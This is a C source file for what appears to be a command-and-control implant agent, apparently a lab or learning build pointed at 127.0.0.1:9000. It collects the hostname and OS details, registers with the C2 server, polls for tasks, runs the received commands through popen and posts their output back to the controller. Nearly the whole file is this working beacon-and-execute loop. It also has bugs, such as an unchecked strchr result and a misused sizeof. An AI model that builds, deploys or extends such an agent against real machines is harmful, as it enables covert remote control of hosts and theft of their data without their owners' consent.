#include <errno.h>
#include <limits.h>
#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <stddef.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/utsname.h>
#include "initiate.h"
#include "curl_utils.h"
#include "host_utils.h"

#define UUIDLEN 36

// Each task begins with a #(35 in DEC).
#define TASK_LINE 35

// Each task file ends with a $(36 in DEC).
#define END_OF_TASK_FILE 36

// ref https://curl.se/libcurl/c/postit2.html

static size_t mem_cb(void *contents, size_t size, size_t nmemb, void *userp);

// Obtains target host information (host name, OS, version).
bool get_host_info(struct agent_info *agent)
{
	// Get target hostname.
	if (gethostname(agent->hostname, sizeof(agent->hostname)) == -1)
	{
		perror("Error acquiring host name.\n");
		return false;
	}

	// Get target OS and version.
	struct utsname buf;
	errno = 0;
	if (uname(&buf) != 0)
	{
		perror("uname error\n");
		return false;
	}

	strncpy(agent->os_type, buf.nodename, sizeof(buf.nodename) + 1);
	strncpy(agent->os_version, buf.version, sizeof(buf.version) + 1);

	return true;
}
// Registers self with C2 server, providing target host information. 
bool reg(struct agent_info *agent, struct strings_array *sa)
{
	struct web_comms web = {NULL, 0, NULL};

	// Prepares curl for use across the various follow on functions that use
	// the curl library.
	if (!curl_prep(&web))
	{
		perror("curl_prep failed\n");
		exit(1);
	}


	add_curl_field(web.form, "hostname", agent->hostname);
	add_curl_field(web.form, "os type", agent->os_type);
	add_curl_field(web.form, "os version", agent->os_version);
	add_curl_field(web.form, "submit", "send");

	// Registration URL
	const char regurl[19] = "127.0.0.1:9000/reg";
	curl_easy_setopt(web.curl, CURLOPT_URL, regurl);

	// Set options for POST
	curl_easy_setopt(web.curl, CURLOPT_MIMEPOST, web.form);

	// Send data to mem_cb function as opposed to writing to stdout.
	curl_easy_setopt(web.curl, CURLOPT_WRITEFUNCTION, mem_cb);

	// Pass sa to callback function.
	curl_easy_setopt(web.curl, CURLOPT_WRITEDATA, (void *)sa);

	// Perform the request, res will get the return code
	web.res = curl_easy_perform(web.curl);

	// char *ret;

	// // Strchr for @, as the c2 server precedes the UUID with the @ character.
	// ret = strchr(sa->response, '@');

	// // Move pointer to the right one (ret +1) to copy UUID after the @ char.
	// strncpy(agent->uuid, ret + 1, UUIDLEN);

	// Check for errors
	if (web.res != CURLE_OK)
	{
		fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(web.res));
		return false;
	}

	// Always cleanup.
	curl_easy_cleanup(web.curl);

	// Then cleanup the form.
	curl_mime_free(web.form);

	return true;
}

// Takes write_function output and stores it in memory.
// Ref: https://everything.curl.dev/libcurl/callbacks/write
static size_t mem_cb(void *contents, size_t size, size_t nmemb, void *userp)
{
	size_t realsize = size * nmemb;
	struct strings_array *mem = (struct strings_array *)userp;

	char *ptr = realloc(mem->response, mem->size + realsize + 1);
	if (!ptr)
	{
		/* out of memory! */
		printf("not enough memory (realloc returned NULL)\n");
		return 0;
	}

	mem->response = ptr;
	memcpy(&(mem->response[mem->size]), contents, realsize);
	mem->size += realsize;
	mem->response[mem->size] = 0;

	//   printf("The data in the function is %s\n\n", mem->memory);

	return realsize;
}

void create_tasks_url(char *response, struct agent_info *agent)
{
	char *ret;

	// Strchr for @, as the c2 server precedes the UUID with the @ character.
	ret = strchr(response, '@');

	// Move pointer to the right one (ret +1) to copy UUID after the @ char.
	strncpy(agent->uuid, ret + 1, UUIDLEN);

	// Concat agent UUID to tasks URL.
	char tasks_url[64] = "127.0.0.1:9000/tasks/";
	strncat(tasks_url, agent->uuid, strlen(agent->uuid));

	// Copy URL to agent->tasks_url.
	strncpy(agent->tasks_url, tasks_url, strlen(tasks_url) +1);
	printf("Tasks URL is: %s", agent->tasks_url);
	agent->got_tasks_url = true;

}


// Executes GET request to C2 server to check for tasks.
bool check_tasks(struct agent_info *agent, struct strings_array *sa)
{
    struct web_comms web = {NULL, 0, NULL};

    if (!curl_prep(&web))
    {
        perror("curl_prep failed\n");
        return false;
    }

	// if(!agent->got_tasks_url) {
	// 	char tasks_url[64] = "127.0.0.1:9000/tasks/";
	// 	strncat(tasks_url, agent->uuid, strlen(agent->uuid));
	// 	strncpy(agent->tasks_url, tasks_url, strlen(tasks_url) +1);
	// 	printf("Tasks URL is: %s", agent->tasks_url);
	// 	agent->got_tasks_url = true;
	// }

	curl_easy_setopt(web.curl, CURLOPT_URL, agent->tasks_url);

	// This line below specifies what to do with the data when we receive it,
	// as opposed to printing it to stdout. We will pass in a ptr to our own function
	// called got_data in this example. This is known as a call back function.
	// Send data to this function as opposed to writing to stdout.
	puts("Made it to mem_cb call in curl_easy_setop\n");
	curl_easy_setopt(web.curl, CURLOPT_WRITEFUNCTION, mem_cb);
	puts("Made it out of mem_cb call in curl_easy_setop\n");
	// Pass sa object to callback function.
	curl_easy_setopt(web.curl, CURLOPT_WRITEDATA, (void *)sa);
	puts("made it out of curl_easy_setopt WRITEDATA\n");

	CURLcode result = curl_easy_perform(web.curl);
	puts("made it past curl_easy_perform\n");
	printf("The data returning from check tasks is %s\n\n", sa->response);

	if (result != CURLE_OK)
	{
		fprintf(stderr, "download problem: %s\n",
				curl_easy_strerror(result));
				return false;
	}

	curl_easy_cleanup(web.curl);
	return true;
}

// Executes a given task.
// ref: https://www.linuxquestions.org/questions/linux-newbie-8/
// help-in-getting-return-status-of-popen-sys-call-870219/
bool run_cmd(struct strings_array *sa, struct tasks *task)
{
	// Allocates space for array to a size of cap (1) * size of char, as size
	// of file is unknown. When memory runs out realloc() will allocate
	// additional memory later in word_extract(). */

	FILE *cmd_fptr = NULL;
	char line[1024] = {'\0'};
	int cmd_ret = 0;
	size_t cur_len = 0;

	// char tasks_url[64] = "127.0.0.1:9000/tasks/";
	// strncat(tasks_url, agent->uuid, strlen(agent->uuid));

	char space[1] = " ";
	strncat(task->cmd, space, sizeof(1));
	strncat(task->cmd, task->args, strlen(task->args));

	printf("Task->cmd after concat is: %s", task->cmd);

	if ((cmd_fptr = popen(task->cmd, "r")) != NULL)
	{
		while (fgets(line, sizeof(line), cmd_fptr) != NULL)
		{
			size_t buf_len = strlen(line);
			char *tmp_space = realloc(sa->results, buf_len + cur_len + 1);
			if (!tmp_space)
			{
				perror("Unable to resize.\n");
				fclose(cmd_fptr);
				free(sa->results);
				return false;
			}
			sa->results = tmp_space;
			strncpy(sa->results + cur_len, line, buf_len);
			cur_len += buf_len;
		}
	}
	cmd_ret = pclose(cmd_fptr);
	printf("The exit status is: %d\n", WEXITSTATUS(cmd_ret));
	if (cmd_ret != 0)
	{
		return false;
	}

	return true;
}

bool post_results(struct strings_array *sa)
{
	struct strings_array chunk = {.response = malloc(0), .size = 0};
	struct web_comms web = {NULL, 0, NULL};

	if (!curl_prep(&web))
	{
		perror("curl_prep failed\n");
		exit(1);
	}

	add_curl_field(web.form, "task id", "1234");

	add_curl_field(web.form, "task results", sa->results);

	// Add submit options to curl field data.
	add_curl_field(web.form, "submit", "send");

	// Registration URL
	const char resurl[27] = "127.0.0.1:9000/results/uuid";

	curl_easy_setopt(web.curl, CURLOPT_URL, resurl);

	curl_easy_setopt(web.curl, CURLOPT_MIMEPOST, web.form);

	// Send data to this function as opposed to writing to stdout.
	curl_easy_setopt(web.curl, CURLOPT_WRITEFUNCTION, mem_cb);

	// Pass chunk to callback function.
	curl_easy_setopt(web.curl, CURLOPT_WRITEDATA, (void *)&chunk);

	// Perform the request, res will get the return code
	web.res = curl_easy_perform(web.curl);

	printf("The data returning from post results is %s\n\n", chunk.response);

	// Check for errors
	if (web.res != CURLE_OK)
	{
		fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(web.res));
		return false;
	}

	// Always cleanup.
	curl_easy_cleanup(web.curl);
	
	free(chunk.response);

	// Then cleanup the form.
	curl_mime_free(web.form);

	return true;
}

bool parse_tasks(char *response, struct tasks *task)
{
	char line[1024] = { '\0' };
	FILE *response_file = char_to_file(response);

	task->strings = malloc((task->cap) * sizeof(*task->strings));
	if (!task->strings) {
		perror("Unable to create space for words.\n");
		return 1;
	}
	int count = 0;
    memset(line, 0, sizeof(line));
// While loop reads each line FILE *word_source (file(s) or stdin).
	while (fgets(line, sizeof(line), response_file) != NULL) {
		++count;
		printf("Line nmb %d %s\n", count, line);
		/*Resizes the array after a valid token is created to allocate
			space for new token. */
		if (task->sz == task->cap) {
			task->cap *= 2;
			char **tmp_space = realloc(task->strings,
							task->cap *
							sizeof(*task->strings));
			if (!tmp_space) {
				perror("Unable to resize.\n");
				fclose(response_file);
				destroy(task);
				return false;
			}
			task->strings = tmp_space;
		}

		size_t len = strlen(line) + 1;
		task->strings[task->sz] =
			malloc(len * sizeof(task->strings[task->sz]));
		if (!task->strings[task->sz]) {
			perror("Unable to resize.\n");
			fclose(response_file);
			destroy(task);
			return false;
		}
		
		if (line[0] == TASK_LINE) {
			strncpy(task->strings[task->sz], line + 1, len);
			task->sz++;
		}

		// strncpy(task->strings[task->sz], line, len);
		// task->sz++;

		// Each task file ends with a #(35 in DEC).
		if (line[0] == END_OF_TASK_FILE) {
			puts("hit break statment\n");
			break;
		}
    	memset(line, 0, sizeof(line));

	}
	puts("********PARSED TASKS*************************");
	for (unsigned int i = 0; i < task->sz; i++) {
		printf("%s\n", task->strings[i]);
	}
	fclose(response_file);
	return true;
}

void destroy(struct tasks *task)
{

	/* Iterates through array elements and frees memory of each line in words
	array.*/
	for (unsigned int j = 0; j < task->sz; j++) {
		if (task->strings[j]) {
			free(task->strings[j]);
		}
	}
	// Frees memory for entire file names array.
	free(task->strings);
}

void memset_task_vals(struct tasks *task)
{

	memset(task->id, 0, sizeof(task->id));
	memset(task->type, 0, sizeof(task->type));
	memset(task->cmd, 0, sizeof(task->cmd));
	memset(task->args, 0, sizeof(task->args));
}

//ref https://stackoverflow.com/questions/52974572/cast-char-to-file-without-saving-the-file
// converts char* to file*.
FILE *char_to_file(char *data) {

    int len;
	len = strlen(data);

    int p[2];
    if (pipe(p) == -1) {
        perror("pipe failed");
        return NULL;
    }

    int rval;
    if ((rval = write(p[1], data, len)) == -1) {
        perror("write failed");
        close(p[0]);
        close(p[1]);
        return NULL;
    } else if (rval < len) {
        printf("write failed, wrote %d, expected %d\n", rval, len);
        close(p[0]);
        close(p[1]);
        return NULL;
    }

    return fdopen(p[0], "r");
}

